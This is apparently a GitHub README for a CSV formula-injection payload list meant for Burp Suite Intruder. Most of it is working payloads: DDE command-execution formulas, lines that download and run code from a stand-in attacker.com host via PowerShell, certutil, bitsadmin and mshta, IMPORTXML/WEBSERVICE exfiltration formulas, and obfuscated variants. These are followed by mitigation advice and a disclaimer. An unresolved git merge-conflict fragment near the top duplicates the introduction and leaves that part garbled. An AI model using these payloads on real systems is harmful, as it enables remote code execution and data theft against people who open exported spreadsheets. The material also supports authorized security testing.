# CSV Injection (Formula Injection) Payload List

CSV Injection, also known as **Formula Injection**, is a security vulnerability where malicious users can inject formulas or commands into CSV files. This attack is executed through formulas that are automatically evaluated when applications like **Microsoft Excel**, **LibreOffice Calc**, or **Google Sheets** open the CSV file.

When a spreadsheet application opens a CSV file, it automatically interprets cells starting with special characters (`=`, `+`, `-`, `@`, `|`) as formulas, which can lead to:
- **Remote Code Execution (RCE)**
- **Data Exfiltration**
- **System Information Disclosure**
- **Privilege Escalation**
=======
<img src="https://github.com/payload-box/csv-injection-payload-list/blob/main/assets/csv-inection-payloadbox-ismailtasdelen.jpeg">

CSV Injection, also known as **Formula Injection**, is a security vulnerability where malicious users can inject formulas or commands into CSV files. This attack is executed through formulas that are automatically evaluated when applications like **Microsoft Excel** or **LibreOffice Calc** open the CSV file.
>>>>>>> 05d3a05b94f7485d49868981bd1c705c4cb4370c

---

## Burp Suite Intruder Payload List

This repository includes a comprehensive payload list specifically designed for **Burp Suite Intruder** testing:

📁 **Location:** `Intruder/csv-injection-intruder.txt`

**Contains 106+ payloads including:**
- Basic formula injection
- DDE (Dynamic Data Exchange) exploitation
- Command execution payloads
- Remote code execution vectors
- Data exfiltration techniques
- Obfuscation methods (URL encoding, tab/quote prefixes)
- Complex formula combinations

### Usage with Burp Suite Intruder
1. Open Burp Suite and navigate to the Intruder tab
2. Configure your attack positions
3. Go to Payloads tab
4. Select "Simple list" as payload type
5. Click "Load" and select `Intruder/csv-injection-intruder.txt`
6. Start the attack and analyze responses

---

## Payload Categories

### 1. DDE (Dynamic Data Exchange) & Command Execution
These payloads abuse the **DDE function** or the `cmd` command to launch system applications like the calculator or Notepad, demonstrating **remote code execution** potential.

**Basic DDE Payloads:**
```text
DDE("cmd";"/C calc";"!A0")
=cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
@SUM(1+9)*cmd|' /C calc'!A0
```

**Advanced Command Execution:**
```text
=cmd|'/c whoami'!A1
=cmd|'/c ipconfig'!A1
=cmd|'/c net user'!A1
=cmd|'/c wmic process call create calc'!A1
```

### 2. Remote Code Execution (RCE)
More advanced payloads can be used to download and execute code from a remote server.

```text
=cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0
=cmd|'/c certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe'!A0
=cmd|'/c bitsadmin /transfer job http://attacker.com/payload.exe C:\temp\payload.exe'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
=cmd|'/c mshta http://attacker.com/payload.hta'!A0
```

### 3. Formula-Based Injection
Malicious formulas can be embedded within other seemingly benign calculations to evade simple detection.

```text
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0
=IF(1=1,cmd|'/c calc'!A1,"false")
=IFERROR(cmd|'/c calc'!A1,"error")
```

### 4. HYPERLINK Exploitation
Hyperlink functions can be used to redirect users to malicious websites or execute local files.

```text
=HYPERLINK("http://attacker.com","Click me")
=HYPERLINK("file:///C:/Windows/System32/calc.exe","Click")
@HYPERLINK("http://attacker.com?c=","Click Here")
```

### 5. Data Exfiltration
These payloads can be used to exfiltrate data to remote servers.

```text
=IMPORTXML(CONCAT("http://attacker.com/?v=",A1),"//a")
=IMPORTFEED("http://attacker.com/feed.xml")
=WEBSERVICE("http://attacker.com")
```

### 6. Obfuscation Techniques

**Tab Character Prefix:**
```text
	=cmd|'/c calc'!A1
	@SUM(1+1)
	=DDE("cmd";"/C calc";"!A0")
```

**Single Quote Prefix:**
```text
'=cmd|'/c calc'!A1
'@SUM(1+1)
'+1+1
```

**URL Encoding:**
```text
%3D1%2B1
%3Dcmd%7C%27%2Fc%20calc%27%21A1
%3DDDE%28%22cmd%22%3B%22%2FC%20calc%22%3B%22%21A0%22%29
```

**Newline/Carriage Return:**
```text
%0A=cmd|'/c calc'!A1
%0D=cmd|'/c calc'!A1
%09=cmd|'/c calc'!A1
```

---

## Impact & Risk

CSV Injection can lead to:

✅ **Remote Code Execution:** Execute arbitrary commands on victim's machine  
✅ **Data Theft:** Exfiltrate sensitive data to attacker-controlled servers  
✅ **System Compromise:** Create backdoors, add users, escalate privileges  
✅ **Network Reconnaissance:** Gather system and network information  
✅ **Malware Distribution:** Download and execute malicious payloads  

---

## Mitigation Strategies

To prevent CSV injection attacks, it is crucial to implement proper input validation and output encoding.

### 1. Input Validation & Sanitization
Treat all user-supplied data that will be included in a CSV file as untrusted. Scrub data to remove or neutralize dangerous characters like:
- Leading equals sign `=`
- Plus sign `+`
- Minus sign `-`
- At sign `@`
- Pipe character `|`
- Tab character `\t`
- Carriage return `\r`

### 2. Output Encoding
When generating CSV files, encode cell values to prevent them from being interpreted as formulas. Common methods include:
- Prefix risky cells with a single quote `'`
- Prefix risky cells with a tab character
- Wrap values in double quotes
- Remove or escape special characters

**Example (Python):**
```python
def sanitize_csv_cell(value):
    if value.startswith(('=', '+', '-', '@', '|', '\t', '\r')):
        return "'" + value
    return value
```

### 3. Security Headers
When serving CSV files through web applications:
- Set appropriate `Content-Type` header: `text/csv`
- Use `Content-Disposition: attachment` to force download
- Consider adding `X-Content-Type-Options: nosniff`

### 4. User Education
- Warn users about the risks of opening CSV files from untrusted sources
- Advise disabling automatic formula calculation in spreadsheet applications
- Recommend using plain text viewers for untrusted CSV files
- Enable "Protected View" in Microsoft Office applications

### 5. Application-Level Controls
- Implement Content Security Policy (CSP)
- Use sandboxing for file processing
- Log and monitor CSV file generation/download activities
- Implement rate limiting on CSV exports

---

## Testing for CSV Injection

### Manual Testing
1. Identify input fields that end up in CSV exports
2. Input test payloads (e.g., `=1+1`, `=cmd|'/c calc'!A1`)
3. Download/export the CSV file
4. Open with Excel/LibreOffice and observe behavior
5. Check if formulas are executed or warnings appear

### Automated Testing with Burp Suite
1. Use the provided `Intruder/csv-injection-intruder.txt` payload list
2. Configure Intruder positions on parameters that might end up in CSV
3. Run the attack and analyze responses
4. Download generated CSVs and verify in spreadsheet applications

---

## References

- [OWASP - CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [System Weakness - CSV Injection](https://systemweakness.com/csv-injection-formula-injection-guide-7f2b10fe9e88)
- [PayloadsAllTheThings - CSV Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection)
- [CWE-1236: Improper Neutralization of Formula Elements in a CSV File](https://cwe.mitre.org/data/definitions/1236.html)

---

## Disclaimer

⚠️ **Warning:** This repository is intended for **educational purposes** and **authorized security testing only**. 

- Only use these payloads on systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- The authors are not responsible for any misuse or damage caused by this information
- Always follow responsible disclosure practices when finding vulnerabilities

---

## Contributing

Contributions are welcome! If you have additional CSV injection payloads or techniques:

1. Fork the repository
2. Add your payloads to the Intruder list
3. Update documentation if needed
4. Submit a pull request

---

## License

This project is licensed under the terms specified in the LICENSE file.

---

## Author

**Ismail Tasdelen**

For security research and penetration testing purposes only.
